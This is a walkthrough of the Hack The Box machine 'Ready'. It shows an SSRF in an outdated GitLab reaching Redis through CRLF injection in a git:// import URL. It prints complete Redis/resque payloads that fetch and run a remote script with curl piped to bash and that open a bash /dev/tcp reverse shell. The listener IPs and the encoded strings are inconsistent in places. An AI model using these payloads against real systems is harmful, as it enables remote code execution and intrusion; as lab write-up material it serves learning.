# 🦊 Ready

#htb-medium

# Scanning with Nmap

\# Initial scan:

```
sudo nmap -p- 10.129.227.132
```

![[Pasted image 20240229134402.png]]

\# port scan

```
sudo nmap -p 22,5080 -sCV 10.129.227.132
```

- `-p` - specify the ports to scan
- `-sCV` - equivalent to `--script=default` and `V` for version number

![[Pasted image 20240229134944.png]]

These scans show that the target machine has two open ports:
- Port 22 for SSH
- Port 5080 running an instance of GitLab

---

# GitLab Instance

Entering `http://10.129.227.132:5080` into the Firefox brings up GitLab

![[Pasted image 20240229135543.png]]

I clicked around the website for a bit but couldn't find anything useful. I tried to login with basic default passwords but still nothing. Then I created an account with arbitrary details and then this took me to a user dashboard page:

![[Pasted image 20240229135947.png]]

I also just kept clicking around on this page too until I came across the help page which had a prompt to update:

![[Pasted image 20240229140353.png]]

Based on this information, I assumed that this is an out of date version of GitLab and it may be prone to exploits.

Port 80 was already in use on my machine so I had to use Port 100 instead:
![[Pasted image 20240229141946.png]]

Now I can give this address to the GitLab instance for the New Project:

![[Pasted image 20240229141821.png]]

I tried to create this project but then I recieved the following error message so I needed to choose a different listening port - I've changed it to `1500` since this is above 1024.

![[Pasted image 20240229142154.png]]

Pressing "Create Project" now shows me this hanging import page:

![[Pasted image 20240229142509.png]]

And on my listener terminal this has come through:

![[Pasted image 20240229142545.png]]

> [!info]- Context
> What has happened so far?
> I have created a listener on the attacker machine that will listen for requests wanting to connect to me on port 1500. Then, I have supplied this information to the GitLab instance so the GitLab requests information from me.
> 
> So far this is not an exploit - this is the application working as it should! The server is expecting to request a file from us so that it can go and do something with it.
> 
> The vulnerability lies is in the fact that the developer doesn't want you to access ports on localhost because those aren't exposed externally - there could be some sensitive protocols listing on localhost. In GitLab's case it is redis which is a caching agent. If you access it there are some command lines you can send to get code execution based upon the protocol so we're looking at this

The exploit I will be taking advantage of is a Server Side Request Forgery and will involve editing the information in the `GET` request in the above screenshot.

The most common way of doing this would be to use Gopher so the URL for the new project would be `gopher://10.10.14.3:1500` but the GitLab form only allows the protocols: `http`, `https`, `ssh`, and `git`.

Because of this the URL can be changed to use `git` instead of http:

![[Pasted image 20240229151435.png]]

Creating a project with this URL shows the following on the listener:

![[Pasted image 20240229151133.png]]

This request can be modified to send different data. This requires creating another new project and then first sending the request to burp suite.

This can be done using FoxyProxy - the Firefox extension in the top right:

![[Pasted image 20240229151645.png]]

Then clicking create project:

![[Pasted image 20240229151858.png]]

This opens the request in the Proxy tab of Burp Suite:

![[Pasted image 20240229152007.png]]

New lines can be added in Burp Suite after the `.git`

![[Pasted image 20240229180447.png]]

When this request is then forwarded, the request is received by the listener:

![[Pasted image 20240229181535.png]]
When these things are put together it means that:
- A malicious request can be redirected to the machines loopback address where redis is running using the URL option for a new project.
- The loopback address can be accessed by using IPv6, hex etc

# Connecting to Localhost

\# set the URL to contain an IPv6 version of the local host address:

![[Pasted image 20240229194202.png]]

\# Creating a new project with this URL allows us to connect to the localhost

![[Pasted image 20240229193939.png]]

\# Create another new project and add the port that redis is running on to the URL:

![[Pasted image 20240229193223.png]]

\# make sure to turn Burp Suite back on in FoxyProxy so that we can modify the data
(turn intercept off and back on to get a clean proxy)

![[Pasted image 20240229194412.png]]

Once "Create project" is clicked the request will be sent over to Burp Suite where the payload can be inserted, before forwarding on

\# add the payload after the `.git` URL:

![[Pasted image 20240229194959.png]]

```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://10.10.14.8/shell.sh|bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
exec
exec
```

\# base64 encoding done using [cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy8xNTAwICAwPiYxJw) to remove "+"'s since this will be passed to the server as a URL (+ signs can be interpreted as spaces instead so it is best to avoid them):

bash -c 'bash -i >& /dev/tcp/10.10.14.15/1500 0>&1'

![[Pasted image 20240229202419.png]]

```
# cyberchef output
YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy8xNTAwICAwPiYxJw==
```

Payload:

```
multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|echo -n YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvMTUwMCAwPiYxJw== | base64 -d | bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
```

![[Pasted image 20240229203630.png]]


Now the payload is loaded into Burp Suite I can click "Forward" and then turn Intercept off. Then on the listener, you can see a connection and reverse shell has worked:

![[Pasted image 20240229203252.png]]

# User Own

Now we have access to the system the user flag can be found after some basic `cd`, `ls` and `cat` commands:

![[Pasted image 20240229203521.png]]

# System Own

The system own for this machine involves Docker container enumeration 

Running this command `cat gitlab.rb | grep -v "^#" | grep .` on `gitlab.rb` produces the following:

![[Pasted image 20240229204521.png]]

I am now a root user in the docker container but I am not a root user on the actual host!

![[Pasted image 20240229205716.png]]


---

# 🔗 Useful Links

**Guides Used:**
- [0xdf - Writeup](https://0xdf.gitlab.io/2021/05/15/htb-ready.html)
- [ippsec - Video](https://www.youtube.com/watch?v=bHVVYBzOX54)
